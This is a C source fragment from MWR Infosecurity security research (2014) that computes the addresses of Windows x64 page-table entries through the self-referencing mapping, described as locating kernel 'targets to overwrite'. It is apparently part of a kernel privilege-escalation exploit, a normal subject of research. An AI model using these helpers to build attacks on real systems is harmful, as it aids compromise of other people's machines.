#include "page.h"

/*
MWR Infosecurity
Jeremy Fetiveau
August 2014
*/

/*
Here are the functions that compute the kernel addresses of the targets to overwrite.
*/

//UINT64 getPTfromVA(UINT64 vaddr)
//{
//	vaddr >>= 9;
//	vaddr >>= 3;
//	vaddr <<= 3;
//	vaddr &= 0xfffff6ffffffffff;
//	vaddr |= 0xfffff68000000000;
//	return vaddr;
//}
//
//UINT64 getPDfromVA(UINT64 vaddr)
//{
//	vaddr >>= 18;
//	vaddr >>= 3;
//	vaddr <<= 3;
//	vaddr &= 0xfffff6fb7fffffff;
//	vaddr |= 0xfffff6fb40000000;
//	return vaddr;
//}
//
//UINT64 getPDPTfromVA(UINT64 vaddr)
//{
//	vaddr >>= 27;
//	vaddr >>= 3;
//	vaddr <<= 3;
//	vaddr &= 0xfffff6fb7dbfffff;
//	vaddr |= 0xfffff6fb7da00000;
//	return vaddr;
//}
//
//UINT64 getPML4fromVA(UINT64 vaddr)
//{
//	vaddr >>= 36;
//	vaddr >>= 3;
//	vaddr <<= 3;
//	vaddr &= 0xfffff6fb7dbedfff;
//	vaddr |= 0xfffff6fb7dbed000;
//	return vaddr;
//}

//32G = 2^5*2^32 = 2^5* 2^20*4K = 2^3 * 2^2 * 2^20 * 4K
static uint32 physical_page_bitmap[4 * 0x100000];

